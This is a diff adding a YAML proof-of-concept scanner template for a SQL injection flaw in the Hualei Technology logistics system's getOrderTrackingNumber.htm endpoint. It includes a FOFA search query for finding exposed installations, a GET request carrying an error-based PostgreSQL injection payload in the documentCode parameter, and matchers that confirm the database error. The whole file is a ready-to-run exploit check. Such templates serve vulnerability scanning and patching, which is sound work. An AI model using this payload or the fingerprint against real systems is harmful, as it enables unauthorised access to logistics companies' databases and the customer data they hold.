@@ -1,0 +1,16 @@
+id: poc-yaml-hualei-technology-getordertrackingnumber-sqli
+info:
+  name: 华磊科技物流系统 getOrderTrackingNumber SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 华磊科技物流系统
+  fofa: body="l_c_bar"||body="l_c_center"
+requests:
+- method: GET
+  path: /getOrderTrackingNumber.htm?documentCode=1'and%0a1=user::integer--
+  expression: "status_code == 200 && \ncontains(body,\"ERROR: invalid input syntax\
+    \ for integer\") &&\ncontains(body,\"postgres\") &&\ncontains(body,\"Error querying\
+    \ database\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
